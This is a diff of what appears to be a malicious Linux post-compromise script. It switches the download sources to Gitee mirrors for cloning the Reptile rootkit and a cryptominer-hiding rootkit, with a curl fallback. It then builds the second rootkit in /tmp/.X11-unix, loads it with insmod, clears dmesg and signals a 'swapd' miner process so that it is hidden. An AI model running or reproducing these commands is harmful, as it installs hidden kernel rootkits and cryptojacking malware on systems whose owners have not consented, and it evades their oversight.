@@ -761,7 +761,7 @@ rm -rf Reptile
 NEEDRESTART_MODE=a apt-get update -y
 yum update -y
 yum install -y ncurses-devel
-git clone https://github.com/f0rb1dd3n/Reptile --depth 1 || {
+git clone https://gitee.com/fengzihk/Reptile.git --depth 1 || {
     echo "[!] Git failed, using direct download";
     curl -L https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip -o reptile.zip && \
     unzip reptile.zip && \
@@ -825,7 +825,7 @@ fi
 echo "[*] hide crypto miner."
 cd /tmp
 cd .X11-unix
-git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make
+git clone https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git && cd hiding-cryptominers-linux-rootkit/ && make
 dmesg -C && insmod rootkit.ko && dmesg
 kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 rm -rf hiding-cryptominers-linux-rootkit/
